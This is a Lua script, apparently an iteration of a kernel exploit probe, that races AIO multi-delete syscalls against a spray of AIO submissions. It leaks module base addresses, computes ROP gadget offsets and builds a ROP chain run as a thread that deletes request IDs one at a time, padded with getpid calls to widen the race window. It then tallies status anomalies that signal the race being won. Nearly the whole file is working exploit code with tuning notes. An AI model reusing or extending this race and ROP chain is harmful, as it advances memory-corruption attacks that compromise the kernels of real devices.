-- CRASH_CLASS: HIGH
-- PROBE 540b: aio_multi_delete race — staggered single-ID deletes
--
-- 540a: 0 anomalies. Problem: ROP deleter blasts 32 IDs in microseconds,
-- finishes before Lua spray even starts. The race window is ~5 instructions
-- inside the delete path — we need spray to be RUNNING when delete fires.
--
-- Fix: delete ONE ID at a time from the ROP child, with padding NOPs
-- between deletes to slow it down. Meanwhile Lua sprays creates (669)
-- continuously. Many more delete calls = many more race windows.
-- Also: create-then-immediately-delete pattern (no poll needed).

print("=== PROBE 540b: AIO RACE STAGGER ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(b, n) for off = 0, n - 4, 4 do wd(b + off, 0) end end
local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end

local Z = uint64(0)
local sc20 = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc455 = make_syscall(455)
local sc240 = make_syscall(240)
local sc669 = make_syscall(669)
local sc664 = make_syscall(664)
local sc662 = make_syscall(662)
local sc670 = make_syscall(670)

local pid = to_num(sc20())
print("pid=" .. pid)

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(Z, info) end)
local eb = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", safe_rd(info + 0x10C) or 0, safe_rd(info + 0x108) or 0))
print("eb=" .. q(eb) .. " lk=" .. q(lk))

local pop_rax_ret     = eb + uint64(0x992)
local pop_rdi_ret     = eb + uint64(0xC9DFE)
local pop_rsi_ret     = eb + uint64(0xD77D)
local pop_rdx_ret     = eb + uint64(0x3B02D7)
local mov_rdi_rax_ret = eb + uint64(0x92C67)
local bare_ret        = eb + uint64(0x42)
local fn_addr         = lk + uint64(0xB57)

-- ============================================================
-- AIO init
-- ============================================================
print("[A] init")
pcall(function() sc670(Z, Z, Z, Z, Z, Z) end)

local urand_path = memory.alloc(16)
write_string(urand_path, "/dev/urandom\0")
local ok_o, urand_fd = pcall(function()
    return make_syscall(5)(uint64(to_num(urand_path)), Z, Z)
end)
urand_fd = ok_o and to_num(urand_fd) or -1
print("  urandom=" .. urand_fd)

-- AIO helpers
local reqs_buf = memory.alloc(0x30)
local data_buf = memory.alloc(0x100)
local res_buf  = memory.alloc(0x100)
local ids_out  = memory.alloc(8)

local function fill_req(base, fd)
    zero(base, 0x28)
    wq(base + 0x08, uint64(16))
    wq(base + 0x10, uint64(to_num(data_buf)))
    wq(base + 0x18, uint64(to_num(res_buf)))
    wd(base + 0x20, fd)
end

local function aio_submit_one(fd)
    fill_req(reqs_buf, fd)
    wd(ids_out, 0)
    local ok, rv = pcall(function()
        return sc669(uint64(1), uint64(to_num(reqs_buf)), uint64(1), uint64(1), uint64(to_num(ids_out)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(ids_out) or 0)
end

local function aio_delete_one(id)
    local id_p = memory.alloc(4); wd(id_p, id)
    local st_p = memory.alloc(4); wd(st_p, 0x77777777)
    local ok, rv = pcall(function()
        return sc662(uint64(to_num(id_p)), uint64(1), uint64(to_num(st_p)))
    end)
    return (ok and to_num(rv) or -999), (safe_rd(st_p) or 0)
end

-- ============================================================
-- Shared memory layout:
-- +0x000: barrier (child spins until 1)
-- +0x004: child done count
-- +0x008: reserved
-- +0x010 .. +0x40F: per-ID delete status (256 slots * 4 bytes)
-- +0x410 .. +0x80F: per-ID id values (256 slots * 4 bytes)
-- ============================================================

local NUM_IDS = 128
local NOP_PAD = 8
local ROUNDS = 3

local ok_sh, shared = pcall(function()
    return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
print("  shared=" .. q(shared))

local function make_tcb()
    local ok_t, p = pcall(function()
        return sc_mmap(Z, uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    for toff = 0, 0x100, 8 do wq(p + toff, p) end
    local ptr = memory.alloc(8); wq(ptr, p)
    return ptr
end

-- Build deleter: sysarch + spin on barrier + for each ID: delete(id, 1, &status) + NOP padding
local function build_deleter(count)
    local map_size = 0x400000  -- 4MB stack for larger chain
    local ok_m, base = pcall(function()
        return sc_mmap(Z, uint64(map_size), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), Z)
    end)
    local base_n = to_num(base)
    local tcb = make_tcb()
    local mid = base_n + (map_size / 2)
    local write_pos = mid - 8
    local offset = 0
    local function emit(v) wq(uint64(write_pos + offset), v); offset = offset + 8 end

    -- sysarch(165, SET_FSBASE=129, &fake_tcb)
    emit(pop_rax_ret); emit(uint64(165))
    emit(pop_rdi_ret); emit(uint64(129))
    emit(pop_rsi_ret); emit(tcb)
    emit(fn_addr)

    -- Spin on barrier: we use nanosleep(0.001s) in a loop checking the flag.
    -- Actually, simpler: just use getpid() as a NOP to burn time while Lua
    -- sets up. The barrier flag approach needs a loop, which needs a branch
    -- gadget we don't have. Instead, pad with 20 getpid() calls (~20 syscalls
    -- of overhead) to give Lua time to start spraying.
    for pad = 1, 20 do
        emit(pop_rax_ret); emit(uint64(20))  -- getpid
        emit(pop_rdi_ret); emit(Z)
        emit(fn_addr)
    end

    -- For each ID slot: call 662(&id_slot, 1, &status_slot)
    -- IDs are at shared+0x410+i*4, statuses at shared+0x010+i*4
    local shared_n = to_num(shared)
    for i = 0, count - 1 do
        local id_addr = uint64(shared_n + 0x410 + i * 4)
        local st_addr = uint64(shared_n + 0x010 + i * 4)

        emit(pop_rax_ret); emit(uint64(662))
        emit(pop_rdi_ret); emit(id_addr)
        emit(pop_rsi_ret); emit(uint64(1))
        emit(pop_rdx_ret); emit(st_addr)
        emit(fn_addr)

        -- NOP padding: extra getpid() calls between deletes to widen the window
        for p = 1, NOP_PAD do
            emit(pop_rax_ret); emit(uint64(20))
            emit(pop_rdi_ret); emit(Z)
            emit(fn_addr)
        end
    end

    -- Write done count
    emit(pop_rax_ret); emit(uint64(count))
    emit(pop_rdi_ret); emit(uint64(shared_n + 4))
    emit(mov_rdi_rax_ret)

    -- thr_exit
    emit(pop_rax_ret); emit(uint64(431))
    emit(pop_rdi_ret); emit(Z)
    emit(fn_addr)

    local tp = memory.alloc(0x40); zero(tp, 0x40)
    wq(tp, bare_ret)
    wq(tp + 0x10, base)
    wq(tp + 0x18, uint64(map_size / 2 + 8))

    return tp, offset
end

-- ============================================================
-- Race rounds
-- ============================================================
print("")
print(string.format("[B] %d rounds, %d ids, %d nop_pad", ROUNDS, NUM_IDS, NOP_PAD))

local total_anomalies = 0
local total_swaps = 0

for round = 1, ROUNDS do
    print(string.format("\n[R%d] Creating %d requests", round, NUM_IDS))

    -- Create batch
    local ids = {}
    local ok_count = 0
    for i = 1, NUM_IDS do
        local rv, id = aio_submit_one(urand_fd)
        if rv == 0 and id > 0 then
            ok_count = ok_count + 1
            ids[ok_count] = id
        end
    end
    print(string.format("  created=%d", ok_count))

    if ok_count < 16 then
        print("  TOO FEW")
    else
        -- Write IDs to shared memory
        zero(shared, 0x1000)
        for i = 1, ok_count do
            wd(shared + 0x410 + (i-1) * 4, ids[i])
            wd(shared + 0x010 + (i-1) * 4, 0x77777777)  -- sentinel
        end

        -- Build and launch deleter
        local tp, csz = build_deleter(ok_count)
        print(string.format("  chain=%dB launching...", csz))

        pcall(function() sc455(uint64(to_num(tp)), uint64(0x38)) end)

        -- Immediately spray creates from Lua — race against child deletes
        local spray_n = 0
        local spray_ids = {}
        for s = 1, ok_count * 3 do
            local rv, id = aio_submit_one(urand_fd)
            if rv == 0 and id > 0 then
                spray_n = spray_n + 1
                spray_ids[spray_n] = id
            end
        end

        -- Wait for child
        local ts = memory.alloc(16)
        wq(ts, uint64(2)); wq(ts + 8, Z)
        for w = 1, 15 do
            if (safe_rd(shared + 4) or 0) > 0 then break end
            pcall(function() sc240(uint64(to_num(ts)), Z) end)
        end
        local child_done = safe_rd(shared + 4) or 0

        -- Analyze delete statuses
        local anomalies, swaps = 0, 0
        local seen = {}
        for i = 0, ok_count - 1 do
            local st = safe_rd(to_num(shared) + 0x010 + i * 4) or 0
            if st == 0x80020010 then
                swaps = swaps + 1
                anomalies = anomalies + 1
                if swaps <= 5 then
                    print(string.format("  *** SWAP slot %d id=0x%X st=0x%08X ***", i, ids[i+1] or 0, st))
                end
            elseif st ~= 0 and st ~= 0x80020003 and st ~= 0x77777777 then
                anomalies = anomalies + 1
                local key = string.format("0x%08X", st)
                seen[key] = (seen[key] or 0) + 1
            end
        end

        print(string.format("  R%d: done=%d spray=%d anomalies=%d swaps=%d",
            round, child_done, spray_n, anomalies, swaps))
        for k, v in pairs(seen) do
            print(string.format("  status %s x%d", k, v))
        end

        total_anomalies = total_anomalies + anomalies
        total_swaps = total_swaps + swaps

        -- Cleanup spray
        for _, sid in ipairs(spray_ids) do
            pcall(function() aio_delete_one(sid) end)
        end
    end
end

print("")
local pid2 = to_num(sc20())
print(string.format("TOTAL: anomalies=%d swaps=%d", total_anomalies, total_swaps))
print("pid=" .. pid2 .. (pid2 == pid and " OK" or " CHANGED"))
print("=== 540b DONE ===")
